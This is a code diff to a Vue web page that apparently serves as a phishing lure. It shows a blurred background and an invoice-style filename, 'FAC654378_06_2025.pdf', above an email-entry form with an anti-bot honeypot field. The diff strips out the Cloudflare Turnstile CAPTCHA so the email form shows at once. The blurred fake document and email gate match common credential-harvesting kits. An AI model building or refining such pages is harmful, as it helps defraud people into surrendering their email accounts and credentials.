@@ -3,18 +3,8 @@
     <!-- Background layer -->
     <div class="background-blur"></div>
 
-    <!-- CAPTCHA Gate -->
-    <div v-if="!captchaToken" class="gate-container">
-      <main>
-        <div class="instructions captcha-adjusted">
-          
-          <div class="cf-turnstile" data-sitekey="0x4AAAAAABgei6QZruCN7n08"></div>
-        </div>
-      </main>
-    </div>
-
-    <!-- Email Verification Section -->
-    <div v-else class="background">
+    <!-- Email Verification Section (always visible since CAPTCHA is removed) -->
+    <div class="background">
       <div class="toto-container">
         <div class="header">
           <div class="logo-text">
@@ -24,9 +14,7 @@
 
         <div class="content">
           <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
-          
           <p style="font-size: 17px;  color: #333333;">FAC654378_06_2025.pdf</p>
-         
 
           <div class="form-wrapper">
             <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
@@ -62,8 +50,6 @@ const email = ref('')
 const honeypot = ref('')
 const error = ref('')
 const loading = ref(false)
-const captchaToken = ref(null)
-let turnstileRendered = false
 
 onMounted(async () => {
   await nextTick()
@@ -77,24 +63,6 @@ onMounted(async () => {
       e.preventDefault()
     }
   })
-
-  if (window.turnstile && !turnstileRendered) {
-    window.turnstile.render('.cf-turnstile', {
-      sitekey: '0x4AAAAAABgei6QZruCN7n08',
-      callback: token => {
-        captchaToken.value = token
-        setTimeout(() => {
-          captchaToken.value = null
-          turnstileRendered = false
-          window.turnstile.render('.cf-turnstile', {
-            sitekey: '0x4AAAAAABgei6QZruCN7n08',
-            callback: t => (captchaToken.value = t)
-          })
-        }, 120000)
-      }
-    })
-    turnstileRendered = true
-  }
 })
 
 function isValidEmail(email) {
@@ -117,7 +85,6 @@ async function submitForm() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         email: email.value,
-        captchaToken: captchaToken.value,
         middleName: honeypot.value
       })
     })
@@ -135,17 +102,6 @@ async function submitForm() {
 }
 </script>
 
-
-
-
-
-
-
-
-
-
-
-
 <style scoped>
 .visually-hidden {
   position: absolute !important;
@@ -154,10 +110,6 @@ async function submitForm() {
   overflow: hidden;
   clip: rect(1px, 1px, 1px, 1px);
   white-space: nowrap;
-}
-
-.captcha-adjusted {
-  margin-top: 25vh !important;
 }
 
 html,
@@ -170,8 +122,7 @@ body {
   background: transparent;
 }
 
-.background,
-.gate-container {
+.background {
   position: relative;
   height: 100vh;
   width: 100vw;
@@ -183,13 +134,6 @@ body {
   padding-top: 60px;
   box-sizing: border-box;
   z-index: 0;
-}
-
-.cf-turnstile {
-  transform: scale(0.9);
-  transform-origin: center;
-  height: auto !important;
-  width: auto !important;
 }
 
 .instructions {
@@ -212,10 +156,9 @@ body {
   flex-direction: column;
   justify-content: center;
   box-sizing: border-box;
-  margin: 50px auto 0 auto; /* TOP margin pushes it downward */
-  transform: translateX(-5%); /* slight horizontal shift */
+  margin: 50px auto 0 auto;
+  transform: translateX(-5%);
 }
-
 
 .header {
   display: flex;
@@ -304,7 +247,6 @@ body {
 }
 </style>
 
-<!-- Background Blur Layer (not scoped) -->
 <style>
 .fullscreen-wrapper {
   position: relative;
@@ -319,7 +261,7 @@ body {
   left: 0;
   width: 100vw;
   height: 100vh;
-  background-image: url('https://i.postimg.cc/bN2DxcPr/sssssint.png'); /* Changeable */
+  background-image: url('https://i.postimg.cc/bN2DxcPr/sssssint.png');
   background-size: cover;
   background-position: center;
   filter: blur(0.1px) brightness(1);
